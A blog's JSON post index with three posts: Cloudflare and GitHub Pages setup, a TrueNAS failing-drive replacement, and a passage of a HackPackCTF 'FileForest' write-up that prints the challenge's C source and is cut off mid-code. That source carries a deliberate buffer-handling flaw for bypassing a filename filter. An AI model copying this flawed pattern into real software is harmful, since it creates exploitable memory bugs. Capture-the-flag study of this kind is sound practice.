[ { "title": "Custom Domain, Bot Protection, and Region Locks on GitHub Pages with Cloudflare", "url": "/posts/Custom-Domain,-Bot-Protection,-and-Region-Locks-on-GitHub-Pages-with-Cloudflare/", "categories": "Privacy", "tags": "GitHub, Cloudflare, DNS", "date": "2025-06-30 04:00:00 -0400", "content": "The Benefits of Custom Domains A custom domain has many benefits. Domains are the foundation layer of web browsing, and owning one gives you significant control over your digital life. Because domains are what humans keep in their brains and what computers use to find content, owning a custom domain makes your whole digital life portable between providers. I currently host my webpage at GitHub, but if GitHub exploded tomorrow, I could point wtthomas.org at a thousand other hosts, and visitors would click on the same links they always have without noticing a difference. If my email provider goes bankrupt and terminates my service, I can point my custom domain at a new email provider and continue to receive all my email. The remainder of this article will assume that you have a custom domain hosted/registered with Cloudflare. There are significant privacy risks when registering a custom domain. Make sure you understand the WHOIS protection offered by your registrar. Mistakes here cannot be corrected later. Pointing a Custom Domain at GitHub Pages First, you need to confirm to GitHub that you own the domain you claim to own. In the GitHub settings under Pages, click Add a domain. GitHub will provide a TXT record which you must add to Cloudflare. GitHub will execute DNS queries against your domain and check for the presence of this record, which will confirm that you control the domain. Go to Cloudflare &gt; Your Custom Domain &gt; DNS &gt; Records. Add the TXT record with the token GitHub provided. Once this is done, go back to GitHub and click verify. This typically happens instantly, but it can take up to 24 hours for your DNS changes to propagate. Next, go to the GitHub repository which contains your webpage. Under Settings &gt; Code and automation &gt; Pages, you can configure the custom domain to point at this repository. GitHub Pages are very versatile, and you should configure the deployment settings according to your set up. My environment uses GitHub Actions to build the raw site HTML from a private repository, so my source is the root of the main branch in the Pages repository, but most environments are simpler and just pull from GitHub Actions directly. Choose what works best for you. Next, add Page’s IP addresses to your Cloudflare DNS. At the time of writing, the IPs that GitHub uses are as follows: 185.199.108.153 185.199.109.153 185.199.110.153 185.199.111.153 See GitHub’s Docs for the most up-to-date IP addresses and DNS record requirements. We will create one A record in DNS for each of these IPs. You can configure them as proxied by flipping the proxy toggle. This will allow us to run HTTPS in the next step. Finally, go to SSL/TLS under your custom domain and select Full . This will allow visitors to connect using HTTPS handled entirely by Cloudflare and GitHub. Bot and Scraping Protection The meteoric rise of LLM-based AI tools opened the floodgates of data scraping and website crawlers. As large sites like Reddit fight scrapers, the scrapers become hungrier to hoover up as much data as possible before it’s too late. While my humble website is no Library of Alexandria, I strongly prefer not to have my content scraped by AI crawlers or archived and published by third party websites. I am not so naïve as to think this Cloudflare feature is a silver bullet. My site will still be scraped, my posts will be cataloged and archived against my wishes, but that is the price to pay for a public presence. I am happy to take Cloudflare’s side in the perpetual war against unauthorized access, and I am grateful for the victories that occur on the margins. Cloudflare offers several types and tiers of bot management, but their free option is sufficient for the scope of a page like mine. Start by going to Security &gt; Overview and looking for the Bot traffic section. Under settings, you’ll see your options to turn on various free Cloudflare tools. I turn all of these on, and I’ll show you some sample success blocks later. The AI Labyrinth is a unique Cloudflare invention which sends AI crawlers down an infinite maze of undesirable content, burning time and money for companies that don’t respect the site owner’s choices. Given this incentive to respect your choices, suddenly bots become more compliant. If I click on my AI Crawl Control tab, I can see successful blocks of bots from various companies over time. Bot fight mode focuses more on keeping non-AI bots away from your page. These bots typically aren’t interested in harvesting content, they’re checking if your site is out-of-date and vulnerable to known attacks. I’ve included a sample below of some of the requests Cloudflare blocked. These bots were targeting wordpress endpoints that have known flaws which, if unpatched, might allow an attacker to gain unauthorized access to your infrastructure. With GitHub pages, this isn’t nearly as much of a concern, but I would rather have these criminals kept away from my site anyway. I expect this field to rapidly advance, and I encourage you to stay current with changes on Cloudflare’s capabilities and recommendations. See Cloudflare’s Docs for up-to-date instructions or best practices. Region Locks Security admins from all walks of work will tell you that blanket region blocks are a great place to start. While an attacker or scraper can get around this with a VPN or a VPS, we want to force them to take this extra step. Never be the lowest hanging fruit or the most attractive target. In my case, I chose to whitelist traffic from the United States. My target audience is colleagues in my field, potential employers, and fellow students at my university. All of the traffic to my site should be coming from the USA. To implement this in Cloudflare, go to Settings &gt; Security rules. If you followed the steps above regarding the bot protections, you may see a rule already configured here for blocking bots and AI agents. Click Create rule &gt; Custom rules. My USA-Only rule configuration is shown below, feel free to modify to fit your preferences. These custom rules are very powerful, so make sure you test thoroughly once implemented. See Cloudflare’s Docs for up-to-date instructions or best practices. " }, { "title": "27 Million Read Errors", "url": "/posts/27-Million-Read-Errors/", "categories": "Self Hosting", "tags": "TrueNAS, Storage", "date": "2025-06-19 04:00:00 -0400", "content": "I recently responded to a data-threatening disk failure on my NAS, this article catalogues my response. I take no responsibility for data loss as a result of repeating the contents of this article. Your hardware and software configuration differ from mine. Always consult up-to-date documentation from hardware and software providers. Backups are king! Failure Notification This may be the most important part of this article. If your system has no way to push information to you, or to a place where you see it, you will probably discover a failure too late. TrueNAS offers several methods to push system notifications, I use two: Telegram and Email. I will briefly cover establishing both. TrueNAS Email For Email alerts to work, you must first configure a Send method in the System &gt; General Settings. TrueNAS offers SMTP or Gmail OAuth. Follow your email provider’s instructions to configure this, and send a test email to confirm it works. Once you have established successful email delivery, go to System &gt; Alert Settings. Click Add and set your desired receiving email address for alerts. As discussed later, I configure my email to use the Notice alert level. TrueNAS Telegram Telegram has a robust ecosystem for bots, but creating and configuring a bot can be obtuse. You will need a token and a chat ID . To get a token, you must create a bot. Telegram has an automated tool for this called BotFather. DM BotFather and use the /start command to get started. After you follow the prompts, he will spit out a token. Keep this token secure. To get a Chat ID, you first need to decide who the bot should talk to. If you only want your notifications to come to your Telegram account, you can create a DM chat with the bot and supply that Chat ID. If you want multiple people to receive notifications (or if you want all your bots to send to the same place, if you have more than one bot), you can create a group chat and use that instead. To acquire a chat ID for a one-on-one DM, first send your bot a message. You can click on the bot’s username in the BotFather DM to start that conversation. Send a message like “hello”. Next, use Telegram’s API to get the chat ID. Open a web browser and navigate to https://api.telegram.org/bot(BOT_TOKEN_HERE)/getUpdates. Replace (BOT_TOKEN_HERE) with your bot token, no parentheses. You will see an output that contains the chat ID, similar to below. If the result JSON object is empty, send the bot another message and try again. To acquire a chat ID for a group chat, you’ll use the same steps as above, but you must create the group chat and give the bot adequate permissions before sending a message to the group chat. To add members, click on the group chat and click the plus icon. Search for the bot’s username and add it. If you send a message and don’t get a useful API result, consider right-clicking on the bot’s name in the group chat members list and clicking Promote to Admin. Once again, we are searching for the chat ID object in the JSON response. Now that you have a Chat ID and Bot Token, we can set it up in TrueNAS. Go to System &gt; Alert Settings and click Add in the Alert Services section. Under Type, select Telegram. Fill in the rest of the information. I advise starting with the Level set to Info. This may result in more alerts than you want, but it gives you the opportunity to refine TrueNAS’s alert levels system-wide. I will not cover this here, but TrueNAS offers granular alert controls. I personally leave my Email option on Notice and my Telegram bot on Info, without changing the default attributions for events. Configure the Alert Settings appropriately for your software, hardware, and risk tolerance. Once everything is configured, send a test alert to confirm your configuration works. If not, review the steps above and consult Telegram’s documentation. My Alert Below is the Email alert that got my attention. Uh oh. Not good. Even though the pool is still online (as opposed to “degraded” or even worse, “offline”), unrecoverable error sounds pretty nasty. An additional piece of context is necessary: these drives are super old. Old drives plus any stability warning is a recipe for immediate intervention. After handling the situation I put the trouble drive on my test bench and found that it has logged 55,000 power-on hours. That’s more than six years of continuous operation. It had a good run. Investigation Step one, log in to the TrueNAS dashboard and see what we can see. I see a red X next to my pool’s ZFS Health, that’s not ideal. I need more information, time to head to the shell. System &gt; Shell. # Let's do a broad system sweep for errors. $ sudo dmesg | grep -i error ... a handful of errors about my ARCHIVE_POOL ... # Let's see if the system journal has anything to say. $ sudo journalctl -xe | grep -i 'kernel' | grep -i 'error' ... Jun 17 19:11:30 TrueNAS zed[3450564]: eid=156 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=36864 offset=96485998592 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691389 Jun 17 19:11:30 TrueNAS zed[3450569]: eid=158 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=36864 offset=96485924864 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691387 Jun 17 19:11:30 TrueNAS zed[3450568]: eid=157 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=36864 offset=96485961728 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691388 Jun 17 19:11:30 TrueNAS zed[3450573]: eid=159 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=36864 offset=96485888000 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691386 Jun 17 19:11:30 TrueNAS zed[3450575]: eid=160 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=36864 offset=96485814272 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691384 Jun 17 19:11:30 TrueNAS zed[3450580]: eid=161 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=36864 offset=96485851136 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691385 Jun 17 19:11:30 TrueNAS zed[3450582]: eid=162 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=36864 offset=96485777408 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691383 Jun 17 19:11:30 TrueNAS zed[3450585]: eid=163 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=36864 offset=96485740544 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691381 Jun 17 19:11:30 TrueNAS zed[3450588]: eid=164 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=36864 offset=96485703680 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691380 Jun 17 19:11:30 TrueNAS zed[3450591]: eid=165 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=36864 offset=96485629952 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691382 Jun 17 19:11:30 TrueNAS zed[3450594]: eid=166 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=36864 offset=96485666816 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691379 Jun 17 19:11:30 TrueNAS zed[3450598]: eid=167 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=36864 offset=96485593088 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691378 Jun 17 19:11:30 TrueNAS zed[3450601]: eid=168 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=32768 offset=96485560320 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691377 Jun 17 19:11:30 TrueNAS zed[3450603]: eid=169 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=32768 offset=96485523456 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691376 Jun 17 19:11:30 TrueNAS zed[3450606]: eid=170 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=32768 offset=96485486592 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691375 Jun 17 19:11:30 TrueNAS zed[3450609]: eid=171 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=32768 offset=96485412864 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691373 Jun 17 19:11:30 TrueNAS zed[3450612]: eid=172 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=32768 offset=96485449728 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691374 Jun 17 19:11:30 TrueNAS zed[3450615]: eid=173 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=32768 offset=96485339136 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691371 Jun 17 19:11:30 TrueNAS zed[3450617]: eid=174 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=32768 offset=96485376000 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691372 Jun 17 19:11:30 TrueNAS zed[3450619]: eid=175 class=checksum pool='ARCHIVE_POOL' vdev=568edbff-2041-46ab-9b2f-77c381bcca24 size=32768 offset=96485302272 priority=4 err=0 flags=0x1000b0 bookmark=152:3769:0:691370 Jun 17 19:11:30 TrueNAS kernel: ata8.00: failed to read SCR 1 (Emask=0x40) Jun 17 19:11:30 TrueNAS kernel: ata8.01: failed to read SCR 1 (Emask=0x40) Jun 17 19:11:30 TrueNAS kernel: ata8.02: failed to read SCR 1 (Emask=0x40) Jun 17 19:11:30 TrueNAS kernel: ata8.03: failed to read SCR 1 (Emask=0x40) Jun 17 19:11:30 TrueNAS kernel: ata8.04: failed to read SCR 1 (Emask=0x40) Jun 17 19:11:30 TrueNAS kernel: ata8.04: exception Emask 0x100 SAct 0x100000 SErr 0x0 action 0x6 frozen Jun 17 19:11:30 TrueNAS kernel: ata8.04: failed command: READ FPDMA QUEUED Jun 17 19:11:30 TrueNAS kernel: ata8.04: cmd 60/d0:a0:08:aa:3b/07:00:0b:00:00/40 tag 20 ncq dma 1024000 in res 00/00:01:09:4f:c2/00:00:00:00:00/00 Emask 0x2 (HSM violation) Jun 17 19:11:30 TrueNAS kernel: ata8.15: SATA link up 6.0 Gbps (SStatus 133 SControl 300) Jun 17 19:11:31 TrueNAS kernel: ata8.00: SATA link up 6.0 Gbps (SStatus 133 SControl 330) Jun 17 19:11:31 TrueNAS kernel: ata8.01: SATA link up 6.0 Gbps (SStatus 133 SControl 330) Jun 17 19:11:32 TrueNAS kernel: ata8.02: SATA link up 6.0 Gbps (SStatus 133 SControl 330) Jun 17 19:11:32 TrueNAS kernel: ata8.03: SATA link up 6.0 Gbps (SStatus 133 SControl 330) Jun 17 19:11:32 TrueNAS kernel: ata8.04: hard resetting link Jun 17 19:11:33 TrueNAS kernel: ata8.04: SATA link up 6.0 Gbps (SStatus 133 SControl 330) Jun 17 19:11:33 TrueNAS kernel: ata8.00: configured for UDMA/133 Jun 17 19:11:33 TrueNAS kernel: ata8.01: configured for UDMA/133 ... Woah! Time for some vocabulary. TrueNAS Scale is an operating system for home/enthusiast servers. TrueNAS Scale uses ZFS (Zettabyte File System) as the backbone and core file system for all its operations. ZFS combines physical drives into Zpools (ZFS Pools) with spectacular performance for Mirroring, Compression, Deduplication, RAID Configurations, Backups, Scrubs, and more. Zpools can host one to many Datasets, one to many Zvols, or a mixture of the two. A Dataset gives the advantage of dynamic size scaling, access control lists, and connections to share services like SMB, FTP, or NFS, and they can be nested within each other. Zvols work more like virtual block devices and would be better for VMs or network boot devices. Given that background, the error messages being related to my ARCHIVE_POOL tells me that something is going wrong at the zpool level. This typically indicates a physical drive failure, but it could also be a software/RAID problem or the work of a threat actor. The SATA kernel errors reinforce my suspicion that it’s a drive failure, but let’s see what’s going on: $sudo zpool status -v ARCHIVE_POOL ... raidz1-0 ONLINE 0 0 0 ac7328bc-fa24-4d20-84ba-4ac4d9e092c4 ONLINE 0 0 0 23960ef1-f52b-4b31-937c-7231970f6b1d ONLINE 0 0 0 b4d7c3aa-7fba-45d9-94e5-1a4708567f0c ONLINE 0 0 0 568edbff-2041-46ab-9b2f-77c381bcca24 ONLINE 0 0 20 errors: No known data errors ... Looks like we have 20 checksum errors on 568edbff-2041-46ab-9b2f-77c381bcca24. What is that? # This command will tell me what physical drive is associated with the ID # given in the status output. $sudo ls -la /dev/disk/by-partuuid/ | grep 568edbff-2041-46ab-9b2f-77c381bcca24 lrwxrwxrwx 1 root root 10 Jun 17 19:18 568edbff-2041-46ab-9b2f-77c381bcca24 -&gt; ../../sde1 This tells me that sde1 is the culprit device. Recall the Linux enumerates SATA drives with sdX or sdXY. sde1 points to the first partition on the fifth SATA drive provisioned by the host. The next step is to run a SMART test and see if that reveals anything helpful: $ sudo smartctl -a /dev/sde1 ... SMART Attributes Data Structure revision number: 10 Vendor Specific SMART Attributes with Thresholds: ID# ATTRIBUTE_NAME FLAG VALUE WORST THRESH TYPE UPDATED WHEN_FAILED RAW_VALUE 1 Raw_Read_Error_Rate 0x000f 074 064 006 Pre-fail Always - 27095952 3 Spin_Up_Time 0x0003 097 097 000 Pre-fail Always - 0 4 Start_Stop_Count 0x0032 096 096 020 Old_age Always - 4669 5 Reallocated_Sector_Ct 0x0033 100 100 010 Pre-fail Always - 0 7 Seek_Error_Rate 0x000f 087 060 045 Pre-fail Always - 531146731 ... Holy smokes! 27 million read errors! This thing needs to go yesterday! Remediation TrueNAS’ ZFS implementation supports a wide set of options for resilvering. For best performance, leave the failing drive in the system and add the recovery drive so both are available to ZFS simultaneously. If the drive has no redundancy or backup, this is not optional. The set of circumstances where it’s appropriate to have a single point of failure in data storage is extremely limited. Do not do this. If your redundancy is configured as a one-to-one mirror, the performance is limited to the read speed of an intact drive(s) and the write speed of the replacement drive, so removing the failing drive in this scenario does not affect the speed of the resilvering process. If your redundancy is configured in a RAID array, removing the failing drive can dramatically slow down the process, as the failed drive must be reconstructed by reading from all the intact drives and doing a bunch of math. If you leave the failing drive in the system, you can just read from the failing drive and correct errors after completing the faster data copy operation. In my situation, I have a RAID array configured with four drives. I have hot-swapping enabled in my motherboard’s BIOS, so I simply plugged in a replacement drive and proceeded with the remediation. I will show you how to check for hot-swapping later. It is extremely preferable to avoid powering off the host machine when a drive is failing. If SATA hot-swapping is supported by your motherboard, I highly encourage you to turn it on before you need it! I will need to use ZFS’s replace command, which will handle all the drive resilvering for me. Before we do this, we must offline the failing drive. Doing this can affect how your entire pool performs, as ZFS becomes very conservative when a drive is down. In an enterprise environment, it is completely appropriate to take this system out of production. For clarity, doing this does not power off the drive, it simply removes it from operation in ZFS and puts the pool in a degraded state. $ sudo zpool offline ARCHIVE_POOL 568edbff-2041-46ab-9b2f-77c381bcca24 # Now confirm that drive is offlined. $ sudo zpool status ARCHIVE_POOL ... raidz1-0 DEGRADED 0 0 0 ac7328bc-fa24-4d20-84ba-4ac4d9e092c4 ONLINE 0 0 0 23960ef1-f52b-4b31-937c-7231970f6b1d ONLINE 0 0 0 b4d7c3aa-7fba-45d9-94e5-1a4708567f0c ONLINE 0 0 0 568edbff-2041-46ab-9b2f-77c381bcca24 OFFLINE 0 0 20 ... Now we need to get our new drive installed. To check for hot-swapping capability before we try (and potentially crash the system if we don’t have it enabled), we can check for AHCI (Advanced Host Controller Interface) support: $ sudo dmesg | grep -i \"ahci\" [ 1.781542] ahci 0000:02:00.1: version 3.0 [ 1.781690] ahci 0000:02:00.1: SSS flag set, parallel bus scan disabled [ 1.781745] ahci 0000:02:00.1: AHCI 0001.0301 32 slots 6 ports 6 Gbps 0x3f impl SATA mode [ 1.781748] ahci 0000:02:00.1: flags: 64bit ncq sntf stag pm led clo only pmp pio slum part sxs deso sadm sds apst [ 1.783219] scsi host0: ahci [ 1.783350] scsi host1: ahci [ 1.783458] scsi host2: ahci [ 1.783572] scsi host3: ahci [ 1.783685] scsi host4: ahci [ 1.783796] scsi host5: ahci [ 1.784005] ahci 0000:05:00.0: SSS flag set, parallel bus scan disabled [ 1.784049] ahci 0000:05:00.0: AHCI 0001.0200 32 slots 2 ports 6 Gbps 0x3 impl SATA mode [ 1.784053] ahci 0000:05:00.0: flags: 64bit ncq sntf stag led clo pmp pio slum part ccc sxs [ 1.784610] scsi host6: ahci [ 1.784756] scsi host7: ahci Bingo! Hot swapping confirmed on my SATA ports. Seeing AHCI enabled is typically enough, but specifically we’re looking for PMP (port multiplier) and NCQ (native command queuing) which are both present on all my interfaces. Before we insert the drive, we need a list of current drives to compare with once we insert the replacement drive: $ sudo ls -la /dev/disk/by-id/ ... &lt;list of drives&gt; ... After inserting the drive, do it again, and identify the drive that wasn’t in the original set. Because it’s not initialized in ZFS or added to a pool yet, we would expect to see the raw serial instead of a ZFS ID. I have redacted the drive serial. $ sudo ls -la /dev/disk/by-id/ ... lrwxrwxrwx 1 root root 10 Jun 17 20:18 ata-[REDACTED] -&gt; ../../sdh lrwxrwxrwx 1 root root 10 Jun 17 20:18 wwn-[REDACTED] -&gt; ../../sdh ... These identifiers are what we need to execute the replace command and resilver the drive. ZFS will automatically handle initializing the drive and importing it into the pool for us. All the data on the replacement drive will be destroyed. The syntax for the replace command is as follows: $ sudo zpool replace &lt;pool name&gt; &lt;existing drive ZFS identifier&gt; &lt;new drive identifier&gt;. ZFS has options for auto-detection, but I prefer to be explicit. You can also use the drive letter /sdh, but I prefer to be explicit. $ sudo zpool replace ARCHIVE_POOL 568edbff-2041-46ab-9b2f-77c381bcca24 /dev/disk/by-id/ata-[REDACTED] # Now confirm the resilveirng has begun. $ sudo zpool status ARCHIVE_POOL ... raidz1-0 DEGRADED 0 0 0 ac7328bc-fa24-4d20-84ba-4ac4d9e092c4 ONLINE 0 0 0 23960ef1-f52b-4b31-937c-7231970f6b1d ONLINE 0 0 0 b4d7c3aa-7fba-45d9-94e5-1a4708567f0c ONLINE 0 0 0 replacing-3 DEGRADED 0 0 0 568edbff-2041-46ab-9b2f-77c381bcca24 OFFLINE 0 0 20 ata-[REDACTED] ONLINE 0 0 0 (resilvering) ... You should also see a little status badge in the top-right corner of the GUI (open in a new tab, you will lose your shell history if you click away!): From this point forward, let ZFS do its work. After the resilvering is complete, the failing drive will be removed from the pool, having been replaced. This drive will show up in the GUI as an unused disk, and at this point you can safely remove it. Prevention I have changed TrueNAS’ default scrub schedule for every drive in the system. By default, my system was running a scrub once every 35 days. Intuitively this is a problem, if a drive develops an issue one day after a scrub, you could be accumulating 34 days of errors before you know. I have updated all my scrub tasks to run daily, ensuring I can respond quickly and minimize any data loss. Also, don’t be lazy. Have an offsite, ideally offline, backup. " }, { "title": "HackPackCTF 2025: FileForest", "url": "/posts/HackPackCTF-FileForest/", "categories": "CTF", "tags": "HackPackCTF", "date": "2025-05-07 04:00:00 -0400", "content": " Category: PWN Difficulty: Easy Points: 500 FileForest begins by using netcat to access a remote environment. You can explore this environment using ls, cd, and cat. You should quickly discover flag.txt, amongst some other text files, using some of the programs built into the environment. You won’t be able to access the directory where the raw file is stored, but you can read the other files there using the fileforest binary which is accessible. The catch: there is some mechanism in fileforest which intercepts “flag” and throws an invalid argument error. Let’s investigate! Further exploration should reveals the source code of the fileforest binary, included below: #include &lt;assert.h&gt; #include &lt;dirent.h&gt; #include &lt;fcntl.h&gt; #include &lt;limits.h&gt; #include &lt;linux/openat2.h&gt; #include &lt;signal.h&gt; #include &lt;stdbool.h&gt; #include &lt;stdint.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;unistd.h&gt; static char const* state_directory = \"/var/lib/fileforest\"; #define FOREST_READ_BUFFER_SIZE 4096 // Wrapper for the openat2(2) system call. static int do_openat2(int dirfd, char const* path, struct open_how how) { long result = syscall(SYS_openat2, dirfd, path, &amp;how, sizeof(how)); if (result &lt; 0) return -1; if (result &gt; INT_MAX) { fprintf(stderr, \"Invalid result from openat2: %ld\\n\", result); exit(1); } return (int) result; } // Opens the directory path within the directory referred to by file // descriptor base_fd. Ensure that name lookup never proceeds outside // base_fd. static int open_beneath(int base_fd, char const* path, uint64_t flags) { return do_openat2(base_fd, path, (struct open_how) { .flags = flags, .resolve = RESOLVE_BENEATH | RESOLVE_NO_MAGICLINKS, }); } typedef struct forest_state { int working_dir; } forest_state; // Safely opens a path within state-&gt;working_dir. static int forest_open(forest_state const* state, char const* path, uint64_t flags) { return open_beneath(state-&gt;working_dir, path, flags); } static void do_read(forest_state const* state, char const* arg) { if (arg == NULL) { printf(\"A path is required.\\n\"); return; } int file = forest_open(state, arg, O_RDONLY); if (file &lt; 0) { printf(\"Could not open file: %s\\n\", arg); return; } bool ends_newline = false; while (1) { char data[FOREST_READ_BUFFER_SIZE] = {0}; ssize_t const read_bytes = read(file, data, sizeof(data)); if (read_bytes &lt; 0) { printf(\"Could not read file: %s\\n\", arg); close(file); return; } if (read_bytes == 0) { break; } fwrite(data, 1, read_bytes, stdout); // Safety: read_bytes &gt; 0. ends_newline = data[read_bytes - 1] == '\\n'; } // Ensure we end the file with a newline, but don't print a double newline. if (!ends_newline) { putc('\\n', stdout); } close(file); } static int cmp_file_names(void const* pa, void const* pb) { char const* a = *(char const**) pa; char const* b = *(char const**) pb; bool a_is_dir = strchr(a, '.') == NULL; bool b_is_dir = strchr(b, '.') == NULL; // Sort directory names first. if (a_is_dir &amp;&amp; !b_is_dir) return -1; if (!a_is_dir &amp;&amp; b_is_dir) return 1; return strcmp(a, b); } static void do_list_files(DIR* dir) { // We do not handle the case of growing. There will be no directories with // more than 512 entries. const size_t names_capacity = 512; size_t files_size = 0; char** const files = calloc(names_capacity, sizeof(*files)); if (files == NULL) { printf(\"Could not list names.\\n\"); // There is no cleanup to do. return; } struct dirent* de; // directory entry pointer while ((de = readdir(dir)) != NULL) { if (files_size == names_capacity) { printf(\"Could not list names.\\n\"); goto cleanup; } assert(files_size &lt; names_capacity); char const* name = de-&gt;d_name; // Don't show empty or hidden entries. // SAFETY: name is a null-terminated string, so reading the first byte is // always okay. if (name[0] == '\\0' || name[0] == '.') { continue; } char* copy = strdup(name); if (copy == NULL) { printf(\"Could not list names.\\n\"); goto cleanup; } // Show the file if its name does not contain a \".\" (assumed to be a directory), or // if the file contains \".txt\". if (strstr(copy, \".\") == NULL || strstr(copy, \".txt\") != NULL) { // Only list .txt files files[files_size] = copy; ++files_size; } } qsort(files, files_size, sizeof(*files), cmp_file_names); for (size_t i = 0; i &lt; files_size; ++i) { printf(\"%s\\n\", files[i]); } cleanup: for (size_t i = 0; i &lt; files_size; ++i) { free(files[i]); } free(files); } static void do_ls(forest_state const* state, char const* path) { if (path == NULL) { path = \".\"; } int const target_fd = forest_open(state, path, O_RDONLY | O_DIRECTORY); if (target_fd &lt; 0) { printf(\"Could not list files.\\n\"); return; } DIR* dr = fdopendir(target_fd); if (dr == NULL) { printf(\"Could not open current directory.\\n\"); close(target_fd); return; } do_list_files(dr); closedir(dr); } static void do_summarize(forest_state const* state, char const* path) { if (path == NULL) { printf(\"A path is required.\\n\"); return; } int file = forest_open(state, path, O_RDONLY); if (file &lt; 0) { printf(\"Could not open file: %s\\n\", path); return; } size_t file_length = 0; size_t newline_count = 0; while (1) { char data[FOREST_READ_BUFFER_SIZE] = {0}; ssize_t const read_bytes = read(file, data, sizeof(data)); if (read_bytes &lt; 0) { printf(\"Could not read file: %s\\n\", path); close(file); return; } if (read_bytes == 0) { break; } file_length += read_bytes; for (size_t i = 0; i &lt; (size_t) read_bytes; ++i) { if (data[i] == '\\n') { ++newline_count; } } } printf(\"File has %zd bytes and %zd newlines.\\n\", file_length, newline_count); } static void do_help(void) { printf(\"%-30s %s\\n\", \"help\", \"Lists FileForest's functions and their uses\"); printf(\"%-30s %s\\n\", \"ls\", \"Lists the text files in the current directory\"); printf(\"%-30s %s\\n\", \"ls [dirname]\", \"Lists the text files in the directory with the given name\"); printf(\"%-30s %s\\n\", \"q\", \"Quits the program\"); printf(\"%-30s %s\\n\", \"read [filename]\", \"Reads the file with the given name\"); printf(\"%-30s %s\\n\", \"summarize [filename]\", \"Gives the number of bytes and lines in the specified file\"); } int main(void) { // Ensure that written output is written promptly (useful for testing over // SSH). setvbuf(stdout, NULL, _IOLBF, BUFSIZ); printf(\"Welcome to FileForest!\\n\"); forest_state state = { .working_dir = open(state_directory, O_RDONLY | O_DIRECTORY), }; if (state.working_dir &lt; 0) { fprintf(stderr, \"Failed to open state directory: %s\\n\", state_directory); exit(1); } char command_line[512] = {0}; char command_arg[512 - 16] = {0}; char command_name[16] = {0}; while (1) { // Fully zero inputs. Our strncpy's below will rely on this. memset(command_line, 0, sizeof(command_line)); memset(command_arg, 0, sizeof(command_arg)); memset(command_name, 0, sizeof(command_name)); printf(\"Command: \"); fflush(stdout); if (fgets(command_line, sizeof(command_line), stdin) == NULL) { return 0; } // Put \"Command: \" on its own line if we are not reading from a terminal. // (If we are reading from a terminal, then the user presses enter, which // will display the newline.) if (!isatty(STDIN_FILENO)) { printf(\"\\n\"); } size_t command_len = strlen(command_line); if (command_len == 0) { continue; } // If we read a newline at the end of the command, ignore it. // SAFETY: command_len != 0. if (command_line[command_len - 1] == '\\n') { command_line[command_len - 1] = '\\0'; } char* arg_start = strchr(command_line, ' '); bool has_arg = false; if (arg_start != NULL) { // Add 1 to arg_start to move past space character. // Subtract 1 from length to ensure final NUL is not overwritten. strncpy(command_arg, arg_start + 1, sizeof(command_arg) - 1); has_arg = true; } if (strstr(command_arg, \"flag\") != NULL) { printf(\"Invalid argument: %s\\n\", command_arg); continue; } // If we have an argument, only copy until before the space. // Otherwise, copy the entire command line. Subtract one from size to ensure // we don't overwrite the final NUL. strncpy(command_name, command_line, arg_start ? (arg_start - command_line) : (sizeof(command_name) - 1)); char const* const effective_arg = has_arg ? command_arg : NULL; // We know the length of the string literal, so pass it as an optimization // rather than using strcmp. if (strncmp(command_name, \"q\", 1) == 0) { printf(\"Goodbye.\\n\"); break; } else if (strncmp(command_name, \"read\", 4) == 0) { do_read(&amp;state, effective_arg); } else if (strncmp(command_name, \"ls\", 2) == 0) { do_ls(&amp;state, effective_arg); } else if (strncmp(command_name, \"summarize\", 9) == 0) { do_summarize(&amp;state, effective_arg); } else if (strncmp(command_name, \"help\", 4) == 0) { do_help(); } else { printf(\"Unknown command: %s\\n\", command_name); printf(\"Use help to see the list of valid commands\\n\"); 